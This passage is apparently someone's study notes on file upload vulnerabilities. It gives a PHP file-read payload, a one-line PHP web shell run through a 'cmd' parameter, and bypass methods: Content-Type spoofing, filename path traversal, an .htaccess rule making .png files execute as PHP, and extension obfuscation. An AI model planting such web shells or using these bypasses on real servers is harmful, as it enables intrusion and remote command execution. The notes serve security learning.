Read arbitrary files:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Web shell:
```php
<?php echo system($_GET['cmd']); ?>
```
To access go to `/path/to/rce.php?cmd=id`

## Content-Type restriction bypass
One way that websites may attempt to validate file uploads is to check that this input-specific `Content-Type` header matches an expected MIME type. If the server is only expecting image files, for example, it may only allow types like `image/jpeg` and `image/png`. 

**Example:** When uploading a file `rce.php` with `Content-Type: application/x-php`, we can change the header to `Content-Type: image/jpeg` to tell the web server that the file we're uploading is an image file.

## Control file location
**Note: In order for this to work, you need to have [Path Traversal & LFI](Path%20Traversal%20&%20LFI.md).**

Let's say we want to change the upload location of `exploit.php` from `/files/avatars/` to `/files/`.

Change the `filename` parameter value from `exploit.php` to the location you want, so `../exploit.php` (we traverse backward one directory). We also URL encode it just to be sure.

![](../../Assets/images/Pasted%20image%2020220819155121.png)

## Bypass extension blacklist
We want to upload `exploit.php` but `.php` file is not allowed.

![](../../Assets/images/Pasted%20image%2020220819162756.png)

**Apache servers**, for example, will load a directory-specific configuration from a file called `.htaccess` if one is present. We can make a `.htaccess` with configurations below,
```
AddType application/x-httpd-php .png
```
This maps a `.png` extension to the executable MIME type` application/x-httpd-php`. As the server uses the mod_php module, it knows how to handle this already.
When we go to the path of `exploit.png`, it should run whatever php code we put inside it.

## Obfuscating file extension
1. Provide multiple extension. Depending on the algorithm `exploit.php.png` may be interpreted as `exploit.png`.
2. Add trailing characters -> `exploit.php.` or `exploit.php `.
3. URL encoding (or double). This could work if the value is decoded server-side.
4. Add semicolons or URL-encoded null byte characters before the file extension, `exploit.php;.jpg` or `exploit.php%00.png`
5. Add nested extension if the website strip the file extension but not recursively, `exploit.p.phphp`.

## Flawed validation of the file's contents
The web server may also validate the content of the file with its header. 

## Resources
1. [File upload vulnerabilities - PortSwigger](https://portswigger.net/web-security/file-upload)